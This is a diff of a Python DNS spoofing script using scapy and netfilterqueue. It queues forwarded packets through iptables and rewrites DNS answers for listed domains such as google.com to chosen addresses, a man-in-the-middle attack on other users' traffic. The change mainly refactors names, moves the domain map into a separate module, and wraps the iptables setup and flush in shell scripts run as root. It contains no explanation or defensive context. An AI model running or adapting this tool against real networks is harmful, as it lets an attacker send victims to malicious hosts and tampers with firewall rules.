@@ -1,28 +1,26 @@
 from scapy.all import *
 from scapy.layers.inet import IP
 from netfilterqueue import NetfilterQueue
+from var.py import dns
 import os
 
-dns = {
-        b"www.google.com.": "xxxxxxxxx",
-        b"google.com": "xxxxxxxxxxxx"
-        }
+os.system("sudo sh iptables.sh")
 
-def process_packet(packet):
+def processP(packet):
     scapy_packet = IP(packet.get_payload())
 
     if scapy_packet.haslayer(DNSRR):
         print("PROCESSING : ", scapy_packet.summary())
 
         try:
-            scapy_packet = modify_packet(scapy_packet)
+            scapy_packet = modify(scapy_packet)
         except IndexError:
             pass
         print("FORWARDING! > ", scapy_packet.summary())
         packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
-def modify_packet(packet):
+def modify(packet):
     qname = packet[DNSQR].qname
     if qname not in dns:
         print("NO MODIFICATION > ", qname)
@@ -42,8 +40,8 @@ os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(Q))
 queue = NetfilterQueue()
 
 try:
-    queue.bind(Q, process_packet)
+    queue.bind(Q, processP)
     queue.run()
 except KeyboardInterrupt:
-    print("flishing..")
-    os.system("iptables --flush")
+    print("Cleaning queue..")
+    os.system("sudo sh ipflush.sh")
